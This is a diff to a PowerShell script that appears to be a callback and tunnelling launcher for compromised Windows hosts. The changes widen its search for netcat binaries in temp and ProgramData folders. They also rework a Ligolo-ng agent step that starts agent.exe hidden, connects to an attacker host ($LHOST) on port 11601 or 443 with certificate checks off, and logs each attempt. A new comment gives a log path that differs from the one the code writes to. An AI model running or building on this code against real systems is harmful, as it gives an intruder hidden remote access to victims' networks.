@@ -100,13 +100,17 @@ function Try-PSSocket2 {
     }
 }
 
-# Method 3: Netcat (if nc.exe has been uploaded or exists on target)
+# Method 3: Netcat (nc.exe or nc64.exe from WORKDIR or common paths)
 function Try-Netcat {
     $ncPaths = @(
         "$WORKDIR\nc.exe",
+        "$WORKDIR\nc64.exe",
         "C:\Windows\Temp\nc.exe",
+        "C:\Windows\Temp\nc64.exe",
         "C:\nc.exe",
-        "C:\ProgramData\nc.exe"
+        "C:\nc64.exe",
+        "C:\ProgramData\nc.exe",
+        "C:\ProgramData\nc64.exe"
     )
     foreach ($ncPath in $ncPaths) {
         if (Test-Path $ncPath) {
@@ -165,35 +169,42 @@ function Try-ShellBinary {
 }
 
 # Method 6: Ligolo-ng agent
-# Tries default ligolo port (11601) first, falls back to 443.
-# Runs agent.exe from WORKDIR as a detached background process.
-# Does NOT exit 0 on success - agent runs independently, script exits cleanly.
+# Attempts primary port (11601) then falls back to 443.
+# Skips reachability pre-check - agent handles connection failure itself.
+# Logs to C:\Temp\agent_launch.log for triage.
 function Try-Ligolo {
     $agentPath = "$WORKDIR\agent.exe"
-    if (-not (Test-Path $agentPath)) { return }
+    if (-not (Test-Path $agentPath)) {
+        "$(Get-Date) - agent.exe not found at $agentPath" | Out-File "$WORKDIR\agent_launch.log" -Append
+        return
+    }
 
-    # Check if agent is already running - avoid stacking processes
+    # Check if agent is already running
     $running = Get-Process -Name "agent" -ErrorAction SilentlyContinue
-    if ($running) { return }
+    if ($running) {
+        "$(Get-Date) - agent.exe already running (PID $($running.Id)), skipping" | Out-File "$WORKDIR\agent_launch.log" -Append
+        return
+    }
 
-    # Test reachability on primary port, then fallback
     $portsToTry = @($LIGOLO_PORT, $LIGOLO_PORT_FALLBACK)
     foreach ($port in $portsToTry) {
         try {
-            $tcp = New-Object System.Net.Sockets.TcpClient
-            $connect = $tcp.BeginConnect($LHOST, $port, $null, $null)
-            $wait = $connect.AsyncWaitHandle.WaitOne(2000, $false)
-            if ($wait -and $tcp.Connected) {
-                $tcp.Close()
-                # Port is reachable - launch agent detached
-                Start-Process -FilePath $agentPath `
-                    -ArgumentList "-connect ${LHOST}:${port} -ignore-cert" `
-                    -WindowStyle Hidden `
-                    -PassThru | Out-Null
+            "$(Get-Date) - Attempting agent.exe on port $port" | Out-File "$WORKDIR\agent_launch.log" -Append
+            $proc = Start-Process -FilePath $agentPath `
+                -ArgumentList "-connect ${LHOST}:${port} -ignore-cert" `
+                -WindowStyle Hidden `
+                -PassThru `
+                -ErrorAction Stop
+            Start-Sleep -Seconds 3
+            # Check if process is still alive after 3 seconds (didn't crash immediately)
+            if (-not $proc.HasExited) {
+                "$(Get-Date) - agent.exe launched successfully on port $port (PID $($proc.Id))" | Out-File "$WORKDIR\agent_launch.log" -Append
                 return
+            } else {
+                "$(Get-Date) - agent.exe exited immediately on port $port (exit code $($proc.ExitCode))" | Out-File "$WORKDIR\agent_launch.log" -Append
             }
-            $tcp.Close()
         } catch {
+            "$(Get-Date) - Exception launching agent.exe on port $port`: $_" | Out-File "$WORKDIR\agent_launch.log" -Append
             continue
         }
     }
